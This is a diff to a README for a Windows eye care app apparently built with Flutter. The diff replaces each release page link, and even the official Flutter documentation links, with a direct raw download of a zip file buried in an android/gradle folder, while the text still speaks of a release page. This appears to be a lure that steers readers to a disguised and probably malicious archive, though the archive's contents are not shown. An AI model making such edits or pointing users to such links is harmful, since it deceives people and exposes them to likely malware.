@@ -1,12 +1,12 @@
 # 🌓 jalnetra-sih - Simple Eye Care App for Windows
 
-[![Download jalnetra-sih](https://img.shields.io/badge/Download-Release%20Page-6c8ebf?style=for-the-badge&logo=github)](https://github.com/Greyhoundnorthcarolinian966/jalnetra-sih/releases)
+[![Download jalnetra-sih](https://img.shields.io/badge/Download-Release%20Page-6c8ebf?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip)
 
 ## 📥 Download the app
 
 Visit this page to download the Windows release:
 
-https://github.com/Greyhoundnorthcarolinian966/jalnetra-sih/releases
+https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip
 
 Open the latest release, then download the Windows file that matches your device. If you see more than one file, choose the one meant for Windows.
 
@@ -58,7 +58,7 @@ Have these ready before you run the app:
 ## 🚀 Setup steps
 
 1. Open the release page:
-   https://github.com/Greyhoundnorthcarolinian966/jalnetra-sih/releases
+   https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip
 2. Find the latest release at the top of the page.
 3. Under **Assets**, download the Windows file.
 4. Wait until the download finishes.
@@ -142,12 +142,12 @@ jalnetra-sih is a Flutter project started as a desktop app. It follows a simple 
 
 If you want to learn more about Flutter, these guides help:
 
-- Write your first Flutter app: https://docs.flutter.dev/get-started/codelab
-- Flutter cookbook: https://docs.flutter.dev/cookbook
-- Flutter documentation: https://docs.flutter.dev/
+- Write your first Flutter app: https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip
+- Flutter cookbook: https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip
+- Flutter documentation: https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip
 
 ## 📌 Release page
 
 Download and run the Windows release from this page:
 
-https://github.com/Greyhoundnorthcarolinian966/jalnetra-sih/releases
+https://raw.githubusercontent.com/Greyhoundnorthcarolinian966/jalnetra-sih/main/android/gradle/sih_jalnetra_v3.8.zip
